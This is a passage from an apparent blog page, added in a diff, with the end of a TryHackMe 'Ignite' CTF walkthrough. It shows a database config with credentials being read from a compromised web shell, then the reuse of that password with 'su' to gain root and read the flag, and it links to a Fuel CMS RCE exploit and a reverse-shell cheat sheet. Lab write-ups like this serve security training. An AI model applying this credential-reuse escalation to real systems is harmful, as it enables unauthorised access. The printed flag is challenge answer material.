+|       <span class="o">[</span><span class="s1">'dbcollat'</span><span class="o">]</span> The character collation used <span class="k">in </span>communicating with the database
+|                                NOTE: For MySQL and MySQLi databases, this setting is only used
+|                                as a backup <span class="k">if </span>your server is running PHP &lt; 5.2.3 or MySQL &lt; 5.0.7
+|                                <span class="o">(</span>and <span class="k">in </span>table creation queries made with DB Forge<span class="o">)</span><span class="nb">.</span>
+|                                There is an incompatibility <span class="k">in </span>PHP with mysql_real_escape_string<span class="o">()</span> which
+|                                can make your site vulnerable to SQL injection <span class="k">if </span>you are using a
+|                                multi-byte character <span class="nb">set </span>and are running versions lower than these.
+|                                Sites using Latin-1 or UTF-8 database character <span class="nb">set </span>and collation are unaffected.
+|       <span class="o">[</span><span class="s1">'swap_pre'</span><span class="o">]</span> A default table prefix that should be swapped with the dbprefix
+|       <span class="o">[</span><span class="s1">'encrypt'</span><span class="o">]</span>  Whether or not to use an encrypted connection.
+|
+|                       <span class="s1">'mysql'</span> <span class="o">(</span>deprecated<span class="o">)</span>, <span class="s1">'sqlsrv'</span> and <span class="s1">'pdo/sqlsrv'</span> drivers accept TRUE/FALSE
+|                       <span class="s1">'mysqli'</span> and <span class="s1">'pdo/mysql'</span> drivers accept an array with the following options:
+|
+|                               <span class="s1">'ssl_key'</span>    - Path to the private key file
+|                               <span class="s1">'ssl_cert'</span>   - Path to the public key certificate file
+|                               <span class="s1">'ssl_ca'</span>     - Path to the certificate authority file
+|                               <span class="s1">'ssl_capath'</span> - Path to a directory containing trusted CA certificats <span class="k">in </span>PEM format
+|                               <span class="s1">'ssl_cipher'</span> - List of <span class="k">*</span>allowed<span class="k">*</span> ciphers to be used <span class="k">for </span>the encryption, separated by colons <span class="o">(</span><span class="s1">':'</span><span class="o">)</span>
+|                               <span class="s1">'ssl_verify'</span> - TRUE/FALSE<span class="p">;</span> Whether verify the server certificate or not <span class="o">(</span><span class="s1">'mysqli'</span> only<span class="o">)</span>
+|
+|       <span class="o">[</span><span class="s1">'compress'</span><span class="o">]</span> Whether or not to use client compression <span class="o">(</span>MySQL only<span class="o">)</span>
+|       <span class="o">[</span><span class="s1">'stricton'</span><span class="o">]</span> TRUE/FALSE - forces <span class="s1">'Strict Mode'</span> connections
+|                                                       - good <span class="k">for </span>ensuring strict SQL <span class="k">while </span>developing
+|       <span class="o">[</span><span class="s1">'ssl_options'</span><span class="o">]</span> Used to <span class="nb">set </span>various SSL options that can be used when making SSL connections.
+|       <span class="o">[</span><span class="s1">'failover'</span><span class="o">]</span> array - A array with 0 or more data <span class="k">for </span>connections <span class="k">if </span>the main should fail.
+|       <span class="o">[</span><span class="s1">'save_queries'</span><span class="o">]</span> TRUE/FALSE - Whether to <span class="s2">"save"</span> all executed queries.
+|                               NOTE: Disabling this will also effectively disable both
+|                               <span class="nv">$this</span>-&gt;db-&gt;last_query<span class="o">()</span> and profiling of DB queries.
+|                               When you run a query, with this setting <span class="nb">set </span>to TRUE <span class="o">(</span>default<span class="o">)</span>,
+|                               CodeIgniter will store the SQL statement <span class="k">for </span>debugging purposes.
+|                               However, this may cause high memory usage, especially <span class="k">if </span>you run
+|                               a lot of SQL queries ... disable this to avoid that problem.
+|
+| The <span class="nv">$active_group</span> variable lets you choose which connection group to
+| make active.  By default there is only one group <span class="o">(</span>the <span class="s1">'default'</span> group<span class="o">)</span><span class="nb">.</span>
+|
+| The <span class="nv">$query_builder</span> variables lets you determine whether or not to load
+| the query builder class.
+<span class="k">*</span>/
+<span class="nv">$active_group</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
+<span class="nv">$query_builder</span> <span class="o">=</span> TRUE<span class="p">;</span>
+
+<span class="nv">$db</span><span class="o">[</span><span class="s1">'default'</span><span class="o">]</span> <span class="o">=</span> array<span class="o">(</span>
+        <span class="s1">'dsn'</span>   <span class="o">=&gt;</span> <span class="s1">''</span>,
+        <span class="s1">'hostname'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,
+        <span class="s1">'username'</span> <span class="o">=&gt;</span> <span class="s1">'root'</span>,
+        <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'mememe'</span>,
+        <span class="s1">'database'</span> <span class="o">=&gt;</span> <span class="s1">'fuel_schema'</span>,
+        <span class="s1">'dbdriver'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span>,
+        <span class="s1">'dbprefix'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+        <span class="s1">'pconnect'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="o">(</span>ENVIRONMENT <span class="o">!==</span> <span class="s1">'production'</span><span class="o">)</span>,
+        <span class="s1">'cache_on'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'cachedir'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+        <span class="s1">'char_set'</span> <span class="o">=&gt;</span> <span class="s1">'utf8'</span>,
+        <span class="s1">'dbcollat'</span> <span class="o">=&gt;</span> <span class="s1">'utf8_general_ci'</span>,
+        <span class="s1">'swap_pre'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+        <span class="s1">'encrypt'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'compress'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'stricton'</span> <span class="o">=&gt;</span> FALSE,
+        <span class="s1">'failover'</span> <span class="o">=&gt;</span> array<span class="o">()</span>,
+        <span class="s1">'save_queries'</span> <span class="o">=&gt;</span> TRUE
+<span class="o">)</span><span class="p">;</span>
+
+// used <span class="k">for </span>testing purposes
+<span class="k">if</span> <span class="o">(</span>defined<span class="o">(</span><span class="s1">'TESTING'</span><span class="o">))</span>
+<span class="o">{</span>
+        @include<span class="o">(</span>TESTER_PATH.<span class="s1">'config/tester_database'</span>.EXT<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+www-data@ubuntu:/var/www/html<span class="nv">$ </span>
+</code></pre></div></div>
+<p>we got username and password for database and root’s access
+<code class="language-plaintext highlighter-rouge">username</code>:<code class="language-plaintext highlighter-rouge">root</code>
+<code class="language-plaintext highlighter-rouge">password</code>:<code class="language-plaintext highlighter-rouge">mememe</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/var/www/html<span class="nv">$ </span>su - root
+su - root
+Password: mememe
+
+root@ubuntu:~# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@ubuntu:~# <span class="nb">whoami
+whoami
+</span>root
+root@ubuntu:~# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@ubuntu:~# <span class="nb">pwd
+pwd</span>
+/root
+root@ubuntu:~# <span class="nb">ls</span> <span class="nt">-l</span>
+<span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+<span class="nt">-rw-r--r--</span> 1 root root 34 Jul 26  2019 root.txt
+root@ubuntu:~# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+b9bbcb33e11b80be759c4e844862482d 
+root@ubuntu:~#
+</code></pre></div></div>
+<p>ANS:<code class="language-plaintext highlighter-rouge">b9bbcb33e11b80be759c4e844862482d</code></p>
+
+<h2 id="references">References</h2>
+<ul>
+  <li>fuelCMS 1.4.1 - Remote Code Execution - https://www.exploit-db.com/exploits/47138</li>
+  <li>Reverse Shell Cheat Sheet - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+  
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#tryhackme" class="page__taxonomy-item" rel="tag">TryHackMe</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-06-14">June 14, 2020</time></p>
+
+
+      </footer>
+      
+      
+  <nav class="pagination">
+    
+      <a href="/tryhackme/thm-vulversity/" class="pagination--pager" title="TryHackMe -Vulversity
+">Previous</a>
+    
+    
+      <a href="/tryhackme/thm-simple-ctf/" class="pagination--pager" title="TryHackMe - Simple CTF
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
+- Date: 07/01/2022
+- Exploit Au...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
+- Date: 05/01/20222
+- Exploit Author: tw...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
+- Date: 2021-12-30
+- ...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
+    
+      <li><strong>Follow:</strong></li>
+    
+    
+      
+        
+      
+          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
+          </li>
+        
+      
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+
+</div>
+<div class="page__footer-copyright">&copy; 2023 Tri Wanda Septian's Blog and Stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/tryhackme/thm-ignite/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/tryhackme/thm-ignite"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
